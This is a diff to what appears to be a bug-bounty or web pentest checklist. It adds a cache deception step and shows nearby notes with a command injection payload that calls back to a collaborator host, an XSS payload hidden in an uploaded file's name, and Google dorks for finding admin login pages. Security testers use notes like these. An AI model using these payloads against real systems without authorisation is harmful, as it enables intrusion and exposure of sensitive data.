@@ -46,7 +46,8 @@
           payload used   :  `whoami`.collaborator-url 
           got callback from  :  root.collaborator-url
       
- 38- if found file upload upload file, intercept it and change the name of file <svg/onload=alert``>.txt and send      
+ 38- if found file upload upload file, intercept it and change the name of file <svg/onload=alert``>.txt and send  
+ 39- try cache deception attack by going to page with senstive information and put file.css in url and try to access many times it should show the senstive page 
 google dorks :   
   site:target.com inurl:adminintitle:login 
   site:website.comintitle:/admin 
